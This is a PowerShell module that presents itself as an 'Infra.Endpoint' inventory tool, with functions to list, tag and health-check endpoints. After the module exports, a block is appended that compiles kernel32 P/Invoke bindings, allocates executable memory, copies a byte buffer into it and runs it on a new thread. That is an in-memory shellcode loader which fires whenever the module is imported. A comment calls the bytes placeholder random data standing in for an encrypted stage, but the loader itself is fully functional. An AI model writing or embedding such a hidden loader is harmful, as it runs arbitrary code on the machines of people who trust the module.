
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

$script:DefaultTimeout = 60
$script:ModuleVersion = '4.8.4'

function Get-InfraEndpoint {
    <#
    .SYNOPSIS
        Returns Infra inventory records.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Test'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}
function Set-InfraEndpointTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}

function Test-InfraEndpointHealth {
    <#
    .SYNOPSIS
        Tests whether an object answers on its management port.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to probe.
    .PARAMETER Port
        TCP port to probe.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

function Resolve-InfraPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ([string]::IsNullOrWhiteSpace($Path)) {
        throw 'Path must not be empty.'
    }
    return [System.IO.Path]::GetFullPath($Path)
}

function Infra-Cache {
    [CmdletBinding()]
    param([string]$Key, [object]$Value)

    if (-not $script:Cache) {
        $script:Cache = @{}
    }
    if ($PSBoundParameters.ContainsKey('Value')) {
        $script:Cache[$Key] = $Value
    }
    return $script:Cache[$Key]
}

function Get-InfraModuleInfo {
    [CmdletBinding()]
    param()

    [pscustomobject]@{
        Module      = 'Infra.Endpoint'
        Version     = $script:ModuleVersion
        Timeout     = $script:DefaultTimeout
        Exported    = @('Get-InfraEndpoint', 'Set-InfraEndpointTag', 'Test-InfraEndpointHealth')
    }
}

if ($ExecutionContext.SessionState.Module) {
    Write-Verbose 'Module session detected.'
}
else {
    Write-Verbose 'Script session detected.'
}

$script:ExportedFunctions = @('Get-InfraEndpoint', 'Set-InfraEndpointTag', 'Test-InfraEndpointHealth')
Write-Verbose ('Exporting {0} functions' -f $script:ExportedFunctions.Count)

Write-Verbose ('Loaded module {0} version {1}' -f 'Infra.Endpoint', $script:ModuleVersion)

$script:Cache = @{}
Write-Verbose ('Cache initialised for {0}' -f 'Infra.Endpoint')

$script:ModuleRoot = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
Write-Verbose ('Module root: {0}' -f $script:ModuleRoot)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

Export-ModuleMember -Function Get-InfraEndpoint, Set-InfraEndpointTag, Test-InfraEndpointHealth, Get-InfraModuleInfo

$LogPath = "$env:TEMP\run.log"

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x01, 0x67, 0x08, 0x4b, 0x06, 0x6a, 0x65, 0x99, 0x9c, 0x94, 0xcb, 0xd4, 0x33, 0x75, 0x14, 0x56,
        0x39, 0xa8, 0x32, 0x7e, 0x4c, 0xc3, 0x22, 0x68, 0x99, 0x3c, 0x05, 0x30, 0x53, 0x30, 0xc0, 0x84,
        0x60, 0xd5, 0xf8, 0xa1, 0x56, 0x7c, 0xf8, 0x26, 0xce, 0xea, 0x25, 0xc5, 0x91, 0xd8, 0xef, 0x37,
        0x79, 0xe3, 0xd5, 0xf7, 0x61, 0xc7, 0x0c, 0x60, 0x84, 0x80, 0xdb, 0x6c, 0x33, 0xf6, 0x1d, 0xfa,
        0x05, 0xec, 0x91, 0x47, 0x96, 0xc2, 0x81, 0xa0, 0xd9, 0x53, 0x4c, 0xd1, 0x3a, 0x87, 0xff, 0x28,
        0x13, 0x7a, 0x74, 0x87, 0x38, 0x74, 0xf7, 0x45, 0x6c, 0x35, 0x8d, 0xa8, 0x3c, 0x21, 0x81, 0xa7,
        0xc5, 0xdf, 0x42, 0x6f, 0x8f, 0x29, 0xe8, 0x67, 0xbd, 0x2a, 0x56, 0x12, 0xaf, 0xe6, 0x14, 0xdc,
        0xea, 0xc4, 0x81, 0x9c, 0xbf, 0x9d, 0xd3, 0xe5, 0x36, 0xe5, 0x13, 0x30, 0xe0, 0x11, 0x0d, 0x66,
        0x86, 0x3c, 0x19, 0x1b, 0x77, 0x06, 0x2d, 0x12, 0x7a, 0xf2, 0xfc, 0x74, 0x1d, 0x6a, 0xdd, 0x0f,
        0xd1, 0x8f, 0xfe, 0x18, 0x38, 0x18, 0x44, 0x30, 0x26, 0xbb, 0xd1, 0x22, 0x35, 0x85, 0x1b, 0x46,
        0x49, 0x49, 0x46, 0x43, 0x7a, 0x99, 0xce, 0x79, 0x55, 0x30, 0x38, 0x34, 0x45, 0xbb, 0x56, 0xf4,
        0xa4, 0x78, 0xf0, 0x08, 0xe3, 0x62, 0xb1, 0x52, 0x75, 0xcc, 0x4a, 0xb1, 0x8a, 0xd4, 0x79, 0x6b,
        0x42, 0x0c, 0xea, 0xc8, 0xf4, 0xa7, 0x7a, 0x5a, 0xd1, 0x9b, 0xea, 0xb8, 0x33, 0x55, 0xc7, 0xcd,
        0x9b, 0xd3, 0x3b, 0xaf, 0x8b, 0xd6, 0x88, 0x96, 0xad, 0xb9, 0x96, 0x4c, 0xb2, 0xc3, 0x70, 0x57,
        0xc6, 0x7f, 0x0e, 0x87, 0x67, 0xa8, 0x1b, 0xcc, 0x1e, 0xad, 0x01, 0x0d, 0xa6, 0x36, 0xda, 0x95,
        0x34, 0x5f, 0x4f, 0x4d, 0x8f, 0xa5, 0x70, 0x91, 0xe8, 0xa9, 0xce, 0xf7, 0x49, 0x6a, 0x1c, 0x0e,
        0x37, 0x8e, 0xaa, 0xde, 0x68, 0xe9, 0x95, 0x97, 0xdf, 0xeb, 0xf2, 0xf3, 0x2d, 0x5c, 0xde, 0x41,
        0x7b, 0x00, 0xc6, 0x43, 0x5c, 0x7d, 0x91, 0xb6, 0x2f, 0x05, 0xc3, 0xcc, 0xdf, 0xd6, 0x38, 0x31,
        0x78, 0x26, 0x56, 0xea, 0xd0, 0xae, 0x39, 0xa7, 0x29, 0xf7, 0x41, 0xaa, 0x4c, 0x33, 0xfc, 0x78,
        0x1d, 0xb1, 0x6b, 0xae, 0x05, 0x75, 0x71, 0x10, 0x5c, 0xcc, 0x77, 0x5f, 0x6a, 0x2c, 0xd9, 0x01,
        0xd6, 0x1d, 0x1b, 0x6d, 0x52, 0x23, 0x89, 0x61, 0x7a, 0x83, 0x03, 0xae, 0x56, 0xe8, 0x29, 0x56,
        0xdf, 0x9c, 0x6c, 0x7f, 0x54, 0x22, 0x04, 0x97, 0x55, 0x2e, 0xab, 0x10, 0x35, 0xd2, 0x1c, 0xbb,
        0xcc, 0x55, 0x0c, 0x50, 0xfd, 0x77, 0xd0, 0xa2, 0x62, 0x24, 0xbf, 0x09, 0x73, 0xf0, 0x30, 0x1f,
        0xe8, 0x8c, 0x5b, 0x6c, 0x49, 0x6e, 0xa8, 0xde, 0xa1, 0xa8, 0xff, 0x02, 0xa6, 0x63, 0x58, 0xac,
        0xac, 0xf8, 0x08, 0x26, 0xb8, 0x21, 0xcb, 0x60, 0x7d, 0x6f, 0xeb, 0x66, 0x17, 0x5d, 0x1e, 0x41,
        0xc0, 0x51, 0x75, 0xbc, 0xa6, 0xf1, 0xc7, 0x50, 0x9b, 0x9f, 0xbf, 0xcb, 0x07, 0xce, 0x60, 0x9d,
        0x32, 0xa7, 0x80
    )

    $HProcess = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($HProcess -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeApi]::WaitForSingleObject($Thread, 4985)
    [void][NativeApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
